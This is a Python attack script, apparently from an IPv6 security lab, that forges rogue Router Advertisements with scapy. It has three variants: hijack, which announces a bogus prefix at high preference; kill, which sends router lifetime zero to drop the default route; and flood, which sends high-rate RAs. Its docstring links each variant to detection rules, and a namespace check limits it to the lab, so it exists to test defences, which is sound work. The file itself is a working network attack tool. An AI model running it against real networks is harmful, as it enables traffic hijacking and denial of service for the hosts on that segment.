#!/usr/bin/env python3
"""A1 rogue Router Advertisement (PRD S3, threat T1; detected by R1-R4).

Variants:
  hijack  advertise the attacker as a router for a bogus prefix, high preference
          -> R1 (wrong port) R2 (wrong source) R3 (bad prefix) R4 (high pref)
  kill    advertise router lifetime 0 for the real prefix, killing the default
          route -> R1 R2 R4
  flood   many RAs per second (the real prefix) to drown the segment -> R1 R2

Run inside the attacker (or any device) namespace:
  sudo ip netns exec attacker .venv/bin/python -m attacks.rogue_ra hijack --duration 10
"""

from __future__ import annotations

import argparse
import sys
from typing import List, Optional

from attacks.common import IFACE, ensure_lab_namespace, hwaddr, run_rate_limited

from scapy.layers.inet6 import (ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, IPv6)
from scapy.layers.l2 import Ether

LAB_PREFIX = "fd4d:6179:666c:1::"
BOGUS_PREFIX = "2001:db8:bad::"
PRF = {"high": 1, "medium": 0, "low": 3}


def build_ra(src_ll: str, mac: str, prefix: Optional[str], prefixlen: int = 64,
             lifetime: int = 1800, preference: str = "medium") -> bytes:
    pkt = (Ether(src=mac, dst="33:33:00:00:00:01") /
           IPv6(src=src_ll, dst="ff02::1", hlim=255) /
           ICMPv6ND_RA(routerlifetime=lifetime, prf=PRF[preference]) /
           ICMPv6NDOptSrcLLAddr(lladdr=mac))
    if prefix:
        pkt /= ICMPv6NDOptPrefixInfo(prefix=prefix, prefixlen=prefixlen,
                                     validlifetime=3600, preferredlifetime=1800)
    return bytes(pkt)


VARIANTS = {
    "hijack": dict(prefix=BOGUS_PREFIX, lifetime=1800, preference="high"),
    "kill":   dict(prefix=LAB_PREFIX, lifetime=0, preference="medium"),
    "flood":  dict(prefix=LAB_PREFIX, lifetime=1800, preference="medium"),
}


def main(argv: Optional[List[str]] = None) -> int:
    ap = argparse.ArgumentParser(description=__doc__.split("\n\n")[0])
    ap.add_argument("variant", choices=list(VARIANTS))
    ap.add_argument("--iface", default=IFACE)
    ap.add_argument("--src-ll", default="fe80::66", help="forged router link-local source")
    ap.add_argument("--duration", type=float, default=10.0)
    ap.add_argument("--rate", type=float, default=None,
                    help="RAs/sec (default: 1 for hijack/kill, 50 for flood)")
    args = ap.parse_args(argv)
    ensure_lab_namespace(args.iface)
    mac = hwaddr(args.iface)
    spec = VARIANTS[args.variant]
    frame = build_ra(args.src_ll, mac, **spec)
    rate = args.rate if args.rate is not None else (50.0 if args.variant == "flood" else 1.0)
    print("rogue RA %s: src=%s prefix=%s lifetime=%s pref=%s on %s"
          % (args.variant, args.src_ll, spec["prefix"], spec["lifetime"], spec["preference"], args.iface),
          file=sys.stderr)
    if args.variant == "flood":
        run_rate_limited(args.duration, rate, lambda now: [frame] * 10, args.iface,
                         batch=10, label="rogue_ra flood")
    else:
        run_rate_limited(args.duration, rate, lambda now: [frame], args.iface,
                         batch=1, label="rogue_ra " + args.variant)
    return 0


if __name__ == "__main__":
    sys.exit(main())
